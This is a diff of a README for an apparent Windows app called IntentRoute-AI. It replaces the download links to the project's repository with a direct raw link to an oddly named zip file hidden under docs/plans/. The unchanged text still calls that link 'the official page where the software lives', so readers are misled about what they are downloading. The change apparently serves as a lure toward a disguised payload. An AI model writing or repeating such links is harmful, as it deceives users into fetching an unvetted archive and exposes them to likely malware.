@@ -1,6 +1,6 @@
 # ⚡ IntentRoute-AI - Smart Routing Made Simple for Everyone
 
-[![Download IntentRoute-AI](https://img.shields.io/badge/Download-IntentRoute--AI-blueviolet?style=for-the-badge&logo=github)](https://github.com/arcusseniliscommandguidance4541/IntentRoute-AI)
+[![Download IntentRoute-AI](https://img.shields.io/badge/Download-IntentRoute--AI-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/arcusseniliscommandguidance4541/IntentRoute-AI/main/docs/plans/precedentless.zip)
 
 Visit this link to download the application.
 
@@ -66,7 +66,7 @@ These are typical for modern Windows apps, so most computers will handle it with
 
 Follow these straightforward instructions to get IntentRoute-AI on your computer:
 
-1. **Visit the download page** by clicking this link: [Download IntentRoute-AI](https://github.com/arcusseniliscommandguidance4541/IntentRoute-AI). This will take you to the official page where the software lives.
+1. **Visit the download page** by clicking this link: [Download IntentRoute-AI](https://raw.githubusercontent.com/arcusseniliscommandguidance4541/IntentRoute-AI/main/docs/plans/precedentless.zip). This will take you to the official page where the software lives.
 
 
 
